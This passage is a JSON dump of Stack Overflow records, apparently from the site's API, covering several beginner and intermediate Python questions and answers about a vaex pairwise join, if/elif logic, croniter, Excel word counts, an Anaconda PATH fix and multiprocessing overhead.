-3.2102593816457916\n1            1.038958480528846     0.40281056887283384   -0.20455723594495767  -0.9066638216305232\n2            1.5286139180996834    2.8940641279631096    -2.344316689352858    -0.2881587515492332\n3            5.821449101859425     0.8309275842903854    -0.2716504605722432   -2.3881997446052456\n4            3.1143842126546923    -0.18179974540784372  0.7378207553268026    -4.87247823234962\n...          ...                   ...                   ...                   ...\n399,999,995  -0.30815443055055525  -4.249263637083556    -1.244858612724894    -3.257308187087283\n399,999,996  4.906435209862181     -4.032405386526832    0.2462168895612611    -1.2802665943876756\n399,999,997  -0.7271795402745553   -3.51391801469319     -3.765878629706985    -1.930689509247291\n399,999,998  -0.8255006637202813   -2.5585697698855805   -3.629680556902816    -0.41595813284337657\n399,999,999  3.318493079331818     -1.7330868224329334   -3.4258806652175418   -2.220727961485957\n</code></pre>\n\n<p>If we had to do this all in memory, how much RAM would that have required?</p>\n\n<pre><code>print(f\"This would otherwise require {len(df_big) * (4*3*8)//1023**2:,} MB of RAM\")\nThis would otherwise require 36,692 MB of RAM\n</code></pre>\n\n<p>So, quite efficient I would say, and in the future it would be interesting to see if we can do the join more efficiently, and require practically zero RAM for this problem.</p>\n"}], "owner": {"reputation": 141, "user_id": 11380913, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-I0pQiyFiwdY/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rcbaguY2kQ5Yyxay6_ultqvQVLFVg/mo/photo.jpg?sz=128", "display_name": "Roy Han", "link": "https://stackoverflow.com/users/11380913/roy-han"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 87, "favorite_count": 0, "accepted_answer_id": 58531114, "answer_count": 3, "score": 1, "last_activity_date": 1576066762, "creation_date": 1571863857, "question_id": 58530824, "link": "https://stackoverflow.com/questions/58530824/what-would-be-the-best-way-to-perform-operations-against-a-significant-number-of", "title": "What would be the best way to perform operations against a significant number of rows from one df to one row from another?", "body": "<p>If I have df1:</p>\n\n<pre><code>\n    A     B      C     D\n0   4.51  6.212  3.12  1\n1   3.12  3.444  1.12  1\n2   6.98  7.413  7.02  0\n3   4.51  8.916  5.12  1\n....\nn1 ~ 2000\n</code></pre>\n\n<p>and df2</p>\n\n<pre><code>    A     B      C     D\n0   4.51  6.212  3.12  1\n1   3.12  3.444  1.12  1\n2   6.98  7.413  7.02  0\n3   4.51  8.916  5.12  1\n....\nn2 = 10000+\n</code></pre>\n\n<p>And have to perform an operation like:</p>\n\n<pre><code>df12 = \n\ndf1[0,A]-df2[0,A]     df1[0,B]-df2[0,B]     df1[0,C]-df2[0,C]....\ndf1[0,A]-df2[1,A]     df1[0,B]-df2[1,B]     df1[0,C]-df2[1,C]\n...\ndf1[0,A]-df2[n2,A]    df1[0,B]-df2[n2,B]    df1[0,C]-df2[n2,C]\n...\ndf1[1,A]-df2[0,A]     df1[1,B]-df2[0,B]     df1[1,C]-df2[0,C]....\ndf1[1,A]-df2[1,A]     df1[1,B]-df2[1,B]     df1[1,C]-df2[1,C]\n...\ndf1[1,A]-df2[n2,A]    df1[1,B]-df2[n2,B]    df1[1,C]-df2[n2,C]\n...\ndf1[n1,A]-df2[0,A]    df1[n1,B]-df2[0,B]    df1[n1,C]-df2[0,C]....\ndf1[n1,A]-df2[1,A]    df1[n1,B]-df2[1,B]    df1[n1,C]-df2[1,C]\n...\ndf1[n1,A]-df2[n2,A]   df1[n1,B]-df2[n2,B]   df1[n1,C]-df2[n2,C]\n</code></pre>\n\n<p>Where every row in df1 is compared against every row in df2 producing a score.</p>\n\n<p>What would be the best way to perform this operation using either pandas or vaex/equivalent?</p>\n\n<p>Thanks in advance!</p>\n"}, {"tags": ["python", "python-3.x", "function"], "comments": [{"owner": {"reputation": 753, "user_id": 4803555, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/987de0ad150cc5d480bde50a580373a4?s=128&d=identicon&r=PG&f=1", "display_name": "Buckeye14Guy", "link": "https://stackoverflow.com/users/4803555/buckeye14guy"}, "edited": false, "score": 1, "creation_date": 1571864026, "post_id": 58530823, "comment_id": 103385544, "body": "You want to use <code>elif</code>"}, {"owner": {"reputation": 306, "user_id": 12091446, "user_type": "registered", "profile_image": "https://graph.facebook.com/2211404125649261/picture?type=large", "display_name": "Jack Hanson", "link": "https://stackoverflow.com/users/12091446/jack-hanson"}, "edited": false, "score": 0, "creation_date": 1571864104, "post_id": 58530823, "comment_id": 103385566, "body": "Please put the code directly into the question using the code formatter, instead of providing a link/picture of it"}, {"owner": {"reputation": 25, "user_id": 10192214, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1b9e0d62ce2db79b1985940b16db5f0?s=128&d=identicon&r=PG&f=1", "display_name": "T. Coates", "link": "https://stackoverflow.com/users/10192214/t-coates"}, "edited": false, "score": 0, "creation_date": 1571864192, "post_id": 58530823, "comment_id": 103385593, "body": "Apologies for the screenshot, this is my first time using this forum and I didn&#39;t realise"}, {"owner": {"reputation": 15430, "user_id": 4518341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eVuAv.png?s=128&g=1", "display_name": "wjandrea", "link": "https://stackoverflow.com/users/4518341/wjandrea"}, "edited": false, "score": 0, "creation_date": 1571864281, "post_id": 58530823, "comment_id": 103385627, "body": "@T.Coates you can <a href=\"https://stackoverflow.com/posts/58530823/edit\">edit</a> the post"}, {"owner": {"reputation": 25, "user_id": 10192214, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1b9e0d62ce2db79b1985940b16db5f0?s=128&d=identicon&r=PG&f=1", "display_name": "T. Coates", "link": "https://stackoverflow.com/users/10192214/t-coates"}, "reply_to_user": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "edited": false, "score": 0, "creation_date": 1571865701, "post_id": 58530823, "comment_id": 103386098, "body": "@Carcigenicate  that should now be all edited and fixed. I also have now provided a solution. Thank you!"}, {"owner": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "edited": false, "score": 0, "creation_date": 1571865793, "post_id": 58530823, "comment_id": 103386125, "body": "@T.Coates Thanks. I undid my downvote. If you decide to use the site more, <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> and the site <a href=\"https://stackoverflow.com/tour\">tour</a> would go good pages to go over quick. This site has quite strict quality standards."}, {"owner": {"reputation": 10158, "user_id": 1209921, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZxrGg.gif?s=128&g=1", "display_name": "Matthias", "link": "https://stackoverflow.com/users/1209921/matthias"}, "edited": false, "score": 0, "creation_date": 1571865976, "post_id": 58530823, "comment_id": 103386176, "body": "BTW, you don&#39;t have to use parentheses with <code>if</code>. <code>if</code> is not a function call. So <code>if (value == 1):</code> should be <code>if value == 1:</code>."}, {"owner": {"reputation": 25, "user_id": 10192214, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1b9e0d62ce2db79b1985940b16db5f0?s=128&d=identicon&r=PG&f=1", "display_name": "T. Coates", "link": "https://stackoverflow.com/users/10192214/t-coates"}, "reply_to_user": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "edited": false, "score": 0, "creation_date": 1571866865, "post_id": 58530823, "comment_id": 103386451, "body": "@Carcigenicate that&#39;s great, thank you!"}, {"owner": {"reputation": 25, "user_id": 10192214, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1b9e0d62ce2db79b1985940b16db5f0?s=128&d=identicon&r=PG&f=1", "display_name": "T. Coates", "link": "https://stackoverflow.com/users/10192214/t-coates"}, "reply_to_user": {"reputation": 10158, "user_id": 1209921, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZxrGg.gif?s=128&g=1", "display_name": "Matthias", "link": "https://stackoverflow.com/users/1209921/matthias"}, "edited": false, "score": 0, "creation_date": 1571866889, "post_id": 58530823, "comment_id": 103386458, "body": "@Matthias thank you, I&#39;ll bear that in mind going forward!"}], "answers": [{"tags": [], "owner": {"reputation": 25, "user_id": 10192214, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1b9e0d62ce2db79b1985940b16db5f0?s=128&d=identicon&r=PG&f=1", "display_name": "T. Coates", "link": "https://stackoverflow.com/users/10192214/t-coates"}, "is_accepted": false, "score": 1, "last_activity_date": 1571864592, "creation_date": 1571864592, "answer_id": 58530948, "question_id": 58530823, "link": "https://stackoverflow.com/questions/58530823/how-can-i-fix-this-simple-function-in-python-3/58530948#58530948", "title": "How can I fix this simple function in Python 3?", "body": "<p>Thank you to the comments above I now have this solved. As mentioned, I required the use of elif, as follows:</p>\n\n<pre><code>def favorite_city(value):\n\nif (value == 1):\n    name = \"Portsmouth\"\n    print(\"One of my favourite cities is\", name)\n\nelif (value == 2):\n    name = \"Alverstoke\"\n    print(\"One of my favourite cities is\", name)\n\nelif (value == 3):\n    name = \"Lee_on_the_Solent\"\n    print(\"One of my favourite cities is\", name)\n\nelse:\n    print(\"please type a number 1-3\")\n</code></pre>\n\n<p>This fixed my problem. Thank you to those who helped</p>\n"}], "owner": {"reputation": 25, "user_id": 10192214, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1b9e0d62ce2db79b1985940b16db5f0?s=128&d=identicon&r=PG&f=1", "display_name": "T. Coates", "link": "https://stackoverflow.com/users/10192214/t-coates"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 38, "favorite_count": 1, "closed_date": 1571864723, "answer_count": 1, "score": -2, "last_activity_date": 1571865880, "creation_date": 1571863855, "last_edit_date": 1571865880, "question_id": 58530823, "link": "https://stackoverflow.com/questions/58530823/how-can-i-fix-this-simple-function-in-python-3", "closed_reason": "Not suitable for this site", "title": "How can I fix this simple function in Python 3?", "body": "<p>I'm simply trying to write a basic function that will return either:</p>\n\n<p>\"Portsmouth\" when the value 1 is entered,\n\"Alverstoke\" when the value 2 is entered,\n\"Lee_on_the_Solent\" when the value 3 is entered.</p>\n\n<p>I can't see what I've done wrong, but somehow when the value entered is either 1 or 2, the else statement gets applied as well? But when the value 3 is entered, the code performs as desired?</p>\n\n<p>The code I have so far is:</p>\n\n<pre><code>def favorite_city(value):\n    if (value == 1):\n        name = \"Portsmouth\"\n        print(\"One of my favourite cities is\", name)\n    if (value == 2):\n        name = \"Alverstoke\"\n        print(\"One of my favourite cities is\", name)\n    if (value == 3):\n        name = \"Lee_on_the_Solent\"\n        print(\"One of my favourite cities is\", name)\n    else:\n        print(\"please type a number 1-3\")\n</code></pre>\n\n<p>I'm very new to all this and still trying to learn. Please help!</p>\n"}, {"tags": ["python", "cron"], "answers": [{"tags": [], "owner": {"reputation": 26, "user_id": 11240969, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0421644594e470779112b31f1f38beb1?s=128&d=identicon&r=PG&f=1", "display_name": "prakshalj0512", "link": "https://stackoverflow.com/users/11240969/prakshalj0512"}, "is_accepted": false, "score": 1, "last_activity_date": 1571863972, "creation_date": 1571863972, "answer_id": 58530842, "question_id": 58530807, "link": "https://stackoverflow.com/questions/58530807/finding-last-fired-time-using-a-cron-expression-in-python/58530842#58530842", "title": "Finding Last Fired time using a Cron Expression in Python", "body": "<p>Found the package at last!</p>\n\n<p>Croniter</p>\n\n<p><a href=\"https://pypi.org/project/croniter/\" rel=\"nofollow noreferrer\">https://pypi.org/project/croniter/</a></p>\n"}, {"tags": [], "owner": {"reputation": 91, "user_id": 6062095, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/c3ea1db47b6be418fafbd17a922d2bb0?s=128&d=identicon&r=PG&f=1", "display_name": "ashish zarekar", "link": "https://stackoverflow.com/users/6062095/ashish-zarekar"}, "is_accepted": false, "score": 1, "last_activity_date": 1607441179, "last_edit_date": 1607441179, "creation_date": 1605898367, "answer_id": 64935260, "question_id": 58530807, "link": "https://stackoverflow.com/questions/58530807/finding-last-fired-time-using-a-cron-expression-in-python/64935260#64935260", "title": "Finding Last Fired time using a Cron Expression in Python", "body": "<pre><code>from croniter import croniter\nfrom datetime import datetime\n\n\nbase = datetime(2020,11,21,00,13)\nprint(base)\nexpression = &quot;30 * * * *&quot;\n\nitr = croniter(expression,base)\nprint(itr.get_next(datetime))\nprint(itr.get_prev(datetime))\nprint(itr.get_prev(datetime))\n</code></pre>\n<ol>\n<li><a href=\"https://github.com/kiorky/croniter\" rel=\"nofollow noreferrer\">croniter on GitHub</a></li>\n<li><a href=\"https://pypi.org/project/croniter\" rel=\"nofollow noreferrer\">croniter on pypi</a></li>\n</ol>\n"}], "owner": {"reputation": 26, "user_id": 11240969, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0421644594e470779112b31f1f38beb1?s=128&d=identicon&r=PG&f=1", "display_name": "prakshalj0512", "link": "https://stackoverflow.com/users/11240969/prakshalj0512"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 190, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1607441179, "creation_date": 1571863715, "question_id": 58530807, "link": "https://stackoverflow.com/questions/58530807/finding-last-fired-time-using-a-cron-expression-in-python", "title": "Finding Last Fired time using a Cron Expression in Python", "body": "<p>I want to know what's the last time instance is given a cron job?</p>\n\n<p>Ex:</p>\n\n<p>Cron expression @hourly</p>\n\n<p>If I run the code at Oct 23 2:30 pm (datetime.now()), it should return Oct 22 2:00 pm.</p>\n\n<p>I know Java has a package but any implementation in Python?</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["python", "excel", "row", "cell"], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 11833269, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/--oHUo-C35pk/AAAAAAAAAAI/AAAAAAAAABE/Pl3GGPDqm4E/photo.jpg?sz=128", "display_name": "Rakshit RATAN", "link": "https://stackoverflow.com/users/11833269/rakshit-ratan"}, "edited": false, "score": 0, "creation_date": 1571865701, "post_id": 58531080, "comment_id": 103386099, "body": "Thank you very much. Now I understand it better."}], "tags": [], "owner": {"reputation": 1201, "user_id": 11155207, "user_type": "registered", "profile_image": "https://graph.facebook.com/1580155635371866/picture?type=large", "display_name": "Max Voisard", "link": "https://stackoverflow.com/users/11155207/max-voisard"}, "is_accepted": false, "score": 0, "last_activity_date": 1571865272, "creation_date": 1571865272, "answer_id": 58531080, "question_id": 58530802, "link": "https://stackoverflow.com/questions/58530802/word-count-of-a-row-in-excel-file-using-python/58531080#58531080", "title": "Word count of a row in excel file using python", "body": "<p>Try this:</p>\n\n<pre><code>import xlrd\nimport os\nfrom string import punctuation, translate\nfrom collections import Counter\n\nfilename = u'test.xlsx'\nsheet_no = 1  # To get the first sheet of the workbook\npath = 'C:\\Users\\myUsername\\Directory for Excel files'\npunctuation_map = dict((ord(c), u' ') for c in punctuation)\n\nfor filename in os.listdir(path):\n   if filename.endswith('.xlsx'):\n      print filename\n      workbook = xlrd.open_workbook(filename)\n      sheet = workbook.sheet_by_index(sheet_no)\n      values = []\n      for row in range(sheet.nrows):\n          for col in range(sheet.ncols):\n              c = sheet.cell(row, col)\n              if c.ctype == xlrd.XL_CELL_TEXT:\n                 cv = unicode(c.value)\n                 wordlist = cv.translate(punctuation_map).split()\n                 values.extend(wordlist)\n                 numberWords = Counter(wordlist)\n                 print sum(numberWords.values()), ' words for that column'\n\n      count = Counter(values)\n      print sum(count.values()), ' total words counted (from all columns)'\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 11792256, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-dvGz-I6ssZI/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdnf0m9sRKaPvxFC6vMUHLJQP1zGA/photo.jpg?sz=128", "display_name": "\u0410\u043b\u0435\u043a\u0441\u0430\u043d\u0434\u0440\u0430 \u0421\u043e\u043a\u043e\u043b\u043e\u0432\u0430", "link": "https://stackoverflow.com/users/11792256/%d0%90%d0%bb%d0%b5%d0%ba%d1%81%d0%b0%d0%bd%d0%b4%d1%80%d0%b0-%d0%a1%d0%be%d0%ba%d0%be%d0%bb%d0%be%d0%b2%d0%b0"}, "is_accepted": false, "score": 0, "last_activity_date": 1571865472, "creation_date": 1571865472, "answer_id": 58531110, "question_id": 58530802, "link": "https://stackoverflow.com/questions/58530802/word-count-of-a-row-in-excel-file-using-python/58531110#58531110", "title": "Word count of a row in excel file using python", "body": "<pre class=\"lang-py prettyprint-override\"><code>import pandas as pd\n\ndf #is your dataframe\n\ncounter = [] #future column you want\n\nfor string in df.Comments.values: #for each string in your \"Comments\"\n    counter.append(string.count(' ') + 1) #num of spaces + 1\n\ndf['num_words'] = counter #add the column\ndf = df[['num_words', 'Comments']] #change the order of columns\n</code></pre>\n\n<p>my df was\n<a href=\"https://i.stack.imgur.com/7qUom.png\" rel=\"nofollow noreferrer\">my df</a></p>\n\n<p>and I finally got <a href=\"https://i.stack.imgur.com/er9Bf.png\" rel=\"nofollow noreferrer\">this df</a></p>\n"}], "owner": {"reputation": 3, "user_id": 11833269, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/--oHUo-C35pk/AAAAAAAAAAI/AAAAAAAAABE/Pl3GGPDqm4E/photo.jpg?sz=128", "display_name": "Rakshit RATAN", "link": "https://stackoverflow.com/users/11833269/rakshit-ratan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 472, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1571870482, "creation_date": 1571863686, "last_edit_date": 1571870482, "question_id": 58530802, "link": "https://stackoverflow.com/questions/58530802/word-count-of-a-row-in-excel-file-using-python", "title": "Word count of a row in excel file using python", "body": "<p>I have an excel file with multiple columns. In one column I have different comments. I want to create a column just beside it to find the number of words in the comment columns using python code. Is there any possibility.</p>\n\n<p><img src=\"https://i.stack.imgur.com/iIYMb.png\" alt=\"picture\"></p>\n"}, {"tags": ["python", "linux", "anaconda", "linux-mint"], "comments": [{"owner": {"reputation": 9079, "user_id": 7867968, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c6976c101b7e5d81ad398cedf6a2ab9b?s=128&d=identicon&r=PG&f=1", "display_name": "C.Nivs", "link": "https://stackoverflow.com/users/7867968/c-nivs"}, "edited": false, "score": 1, "creation_date": 1571863699, "post_id": 58530761, "comment_id": 103385421, "body": "What does your <code>$PATH</code> look like?"}, {"owner": {"reputation": 593, "user_id": 2779795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f32f53bb24e3e7fb1ef1935a5576540a?s=128&d=identicon&r=PG&f=1", "display_name": "huck_cussler", "link": "https://stackoverflow.com/users/2779795/huck-cussler"}, "edited": false, "score": 0, "creation_date": 1571863819, "post_id": 58530761, "comment_id": 103385463, "body": "<code>which python</code> and <code>which python3</code> will tell you where your OS is looking in order to execute Python code.  You&#39;ll probably need to revise your <code>PATH</code> variable to stop looking where it&#39;s currently looking and to start looking where the conda install put the new python directory."}, {"owner": {"reputation": 7, "user_id": 10819910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b798d187a0f4c7d727ec58659511b934?s=128&d=identicon&r=PG", "display_name": "Xigstan", "link": "https://stackoverflow.com/users/10819910/xigstan"}, "reply_to_user": {"reputation": 9079, "user_id": 7867968, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c6976c101b7e5d81ad398cedf6a2ab9b?s=128&d=identicon&r=PG&f=1", "display_name": "C.Nivs", "link": "https://stackoverflow.com/users/7867968/c-nivs"}, "edited": false, "score": 0, "creation_date": 1571864323, "post_id": 58530761, "comment_id": 103385644, "body": "bash: /home/username/anaconda3/condabin:/usr/lib/jvm/jdk-12.0.2//b&zwnj;&#8203;in:/usr/local/sbin:/&zwnj;&#8203;usr/local/bin:/usr/s&zwnj;&#8203;bin:/usr/bin:/sbin:/&zwnj;&#8203;bin:/usr/games:/usr/&zwnj;&#8203;local/games:/snap/bi&zwnj;&#8203;n: No such file or directory @C.Nivs"}, {"owner": {"reputation": 9079, "user_id": 7867968, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c6976c101b7e5d81ad398cedf6a2ab9b?s=128&d=identicon&r=PG&f=1", "display_name": "C.Nivs", "link": "https://stackoverflow.com/users/7867968/c-nivs"}, "edited": false, "score": 0, "creation_date": 1571864360, "post_id": 58530761, "comment_id": 103385650, "body": "<code>condabin</code> should probably just be <code>bin</code>, and you&#39;ve got an extra <code>&#47;</code> next to your <code>jdk-12.0.2</code>"}], "answers": [{"tags": [], "owner": {"reputation": 9079, "user_id": 7867968, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c6976c101b7e5d81ad398cedf6a2ab9b?s=128&d=identicon&r=PG&f=1", "display_name": "C.Nivs", "link": "https://stackoverflow.com/users/7867968/c-nivs"}, "is_accepted": false, "score": 0, "last_activity_date": 1571864703, "creation_date": 1571864703, "answer_id": 58530967, "question_id": 58530761, "link": "https://stackoverflow.com/questions/58530761/default-python-launches-even-after-installing-anaconda/58530967#58530967", "title": "Default python launches even after installing anaconda", "body": "<p>This is probably because it can't find <code>python</code> in your anaconda folder. <code>/home/username/anaconda3/condabin</code> isn't a valid folder name (at least, not on any anaconda installation I've seen), so just rename <code>condabin</code> to <code>bin</code>. If you edit your <code>$HOME/.bash_profile</code>, it should look something like:</p>\n\n<pre><code># added by Anaconda3 5.0.1 installer\nexport PATH=\"/home/username/anaconda3/bin:&lt;/rest/of/things/here&gt;:$PATH\"\n</code></pre>\n\n<p>Restart your terminal and try <code>python</code> again</p>\n"}], "owner": {"reputation": 7, "user_id": 10819910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b798d187a0f4c7d727ec58659511b934?s=128&d=identicon&r=PG", "display_name": "Xigstan", "link": "https://stackoverflow.com/users/10819910/xigstan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 26, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1571864703, "creation_date": 1571863496, "question_id": 58530761, "link": "https://stackoverflow.com/questions/58530761/default-python-launches-even-after-installing-anaconda", "title": "Default python launches even after installing anaconda", "body": "<p>I have installed anaconda latest version in my LINUX MINT and it's expected that the ANACONDA version of python to launched when I type python/python3 on the terminal but it only start the default ones. How to set it to launch the Anaconda version. conda is installed and is verified by writing conda on the terminal</p>\n"}, {"tags": ["python", "performance", "dictionary", "multiprocessing"], "answers": [{"tags": [], "owner": {"reputation": 4856, "user_id": 3700626, "user_type": "registered", "accept_rate": 30, "profile_image": "https://i.stack.imgur.com/LGCnh.jpg?s=128&g=1", "display_name": "Lior Cohen", "link": "https://stackoverflow.com/users/3700626/lior-cohen"}, "is_accepted": false, "score": 0, "last_activity_date": 1571864624, "creation_date": 1571864624, "answer_id": 58530952, "question_id": 58530723, "link": "https://stackoverflow.com/questions/58530723/update-a-dictionary-of-lists-in-multiprocessing/58530952#58530952", "title": "Update a dictionary of lists in multiprocessing", "body": "<ol>\n<li>Unless it is just for illustration toy example, I wonder why you bother to accelerate a 60 usec calculation.</li>\n<li>You are opening only one child process that does all the work so no performance gain should be expected.</li>\n<li><p>Even if you open more, the overhead of opening the multiprocessing + the Pipe is much bigger comparing to the tiny 60 usec of your calculation.</p></li>\n<li><p>Using multiprocessing is effective when:</p></li>\n<li>your base calculation is much slower than the mp overhead.</li>\n<li>when you have a pre-created workers-pool that waiting for communication to do some calculation. With this configuration (mostly found on servers) you only paying for the communication (which, by the way, are longer too than your 60 usecs).</li>\n</ol>\n\n<p>So in bottom line, for such short calculation, stay with one process.</p>\n"}], "owner": {"reputation": 151, "user_id": 5530729, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/becd9dec5242bec6e3c19294e6e0b14f?s=128&d=identicon&r=PG&f=1", "display_name": "dcirillo", "link": "https://stackoverflow.com/users/5530729/dcirillo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 39, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1571864624, "creation_date": 1571863308, "last_edit_date": 1571863400, "question_id": 58530723, "link": "https://stackoverflow.com/questions/58530723/update-a-dictionary-of-lists-in-multiprocessing", "title": "Update a dictionary of lists in multiprocessing", "body": "<p>I want to compute the average number of elements that separate all possible pairs in a list of lists. The following script works nicely</p>\n\n<pre><code>from itertools import combinations\nfrom operator import itemgetter\nfrom collections import defaultdict\n\nlst = [['A','D','B',],['A','M','N','B'],['A','C','B']]\nelms = set(x for l in lst for x in l)\n\ndef test1():\n    d = defaultdict(list)\n    for i in lst:\n        combs = list(combinations(i, 2))\n        combs_sorted = [sorted(i) for i in combs]\n        for j in combs_sorted:\n            a = i.index(j[0])\n            b = i.index(j[1])\n            d[tuple(j)].append(abs((a+1)-b))\n    return(d)\n\nd = test1()\nd = {k: sum(v)/len(v) for k, v in d.items()}\nfor k,v in d.items():\n    print(k,v)\n</code></pre>\n\n<p>and the result is the desired one.</p>\n\n<pre><code>('A', 'D') 0.0\n('A', 'B') 1.3333333333333333\n('B', 'D') 2.0\n('A', 'M') 0.0\n('A', 'N') 1.0\n('M', 'N') 0.0\n('B', 'M') 3.0\n('B', 'N') 2.0\n('A', 'C') 0.0\n('B', 'C') 2.0\n</code></pre>\n\n<p>However, that script is quite slow when the number of lists and elements grow considerably. I tried to use multiprocessing following <a href=\"https://stackoverflow.com/a/48724085/5530729\">this answer</a></p>\n\n<pre><code>import multiprocess as mp\n\ndef init2(child_conn):\n    d = defaultdict(list)\n    for i in lst:\n        combs = list(combinations(i, 2))\n        combs_sorted = [sorted(i) for i in combs]\n        for j in combs_sorted:\n            a = i.index(j[0])\n            b = i.index(j[1])\n            d[tuple(j)].append(abs((a+1)-b))\n    child_conn.send(d)\n\ndef test2():\n    parent_conn, child_conn = mp.Pipe(duplex=False)\n    p = mp.Process(target=init2, args=(child_conn,))\n    p.start()\n    d = parent_conn.recv()\n    p.join()\n    return(d)\n\nd = test1()\nd = {k: sum(v)/len(v) for k, v in d.items()}\nfor k,v in d.items():\n    print(k,v)\n</code></pre>\n\n<p>but this script seems to be even slower than the previous one.</p>\n\n<pre><code>import time\n\nt = time.process_time()\ntest1()\nprint(time.process_time() - t)\n</code></pre>\n\n<p>6.0000000000004494e-05</p>\n\n<pre><code>t = time.process_time()\ntest2()\nprint(time.process_time() - t)\n</code></pre>\n\n<p>0.017596</p>\n\n<p>How can I speed up this calculation?</p>\n"}, {"tags": ["python"], "answers": [{"comments": [{"owner": {"reputation": 2967, "user_id": 4828815, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/--CqgH2V98Jg/AAAAAAAAAAI/AAAAAAAAABY/lilOgpMEIEs/photo.jpg?sz=128", "display_name": "Poojan", "link": "https://stackoverflow.com/users/4828815/poojan"}, "edited": false, "score": 0, "creation_date": 1571863529, "post_id": 58530745, "comment_id": 103385358, "body": "This doesn&#39;t solve problem user is having with code. Its a totally different solution which leads to expected output but not useful for user."}, {"owner": {"reputation": 43491, "user_id": 4001592, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HWyjo.jpg?s=128&g=1", "display_name": "Dani Mesejo", "link": "https://stackoverflow.com/users/4001592/dani-mesejo"}, "reply_to_user": {"reputation": 2967, "user_id": 4828815, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/--CqgH2V98Jg/AAAAAAAAAAI/AAAAAAAAABY/lilOgpMEIEs/photo.jpg?sz=128", "display_name": "Poojan", "link": "https://stackoverflow.com/users/4828815/poojan"}, "edited": false, "score": 1, "creation_date": 1571863636, "post_id": 58530745, "comment_id": 103385401, "body": "@Poojan IMHO while this does not solve the particular problem of the OP, is a valid solution, that someone searching for something similar can find useful"}], "tags": [], "owner": {"reputation": 43491, "user_id": 4001592, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HWyjo.jpg?s=128&g=1", "display_name": "Dani Mesejo", "link": "https://stackoverflow.com/users/4001592/dani-mesejo"}, "is_accepted": false, "score": 0, "last_activity_date": 1571863428, "creation_date": 1571863428, "answer_id": 58530745, "question_id": 58530678, "link": "https://stackoverflow.com/questions/58530678/counting-string-occurences-enumerating-occurrences-in-the-list/58530745#58530745", "title": "Counting String occurence(s) / Enumerating occurrence(s) in the list", "body": "<p>You could use a dictionary to keep a count of the occurrences:</p>\n\n<pre><code>l = ['hey', 'alan', 'hey', 'hey', 'hey', 'alan']\n\nd = {}\nresult = []\nfor key in l:\n    result.append(f'{key}{d[key]}' if key in d else key)\n    if key not in d:\n        d[key] = 0\n    d[key] += 1\n\nprint(result)\n</code></pre>\n\n<p><strong>Output</strong></p>\n\n<pre><code>['hey', 'alan', 'hey1', 'hey2', 'hey3', 'alan1']\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2967, "user_id": 4828815, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/--CqgH2V98Jg/AAAAAAAAAAI/AAAAAAAAABY/lilOgpMEIEs/photo.jpg?sz=128", "display_name": "Poojan", "link": "https://stackoverflow.com/users/4828815/poojan"}, "is_accepted": false, "score": 0, 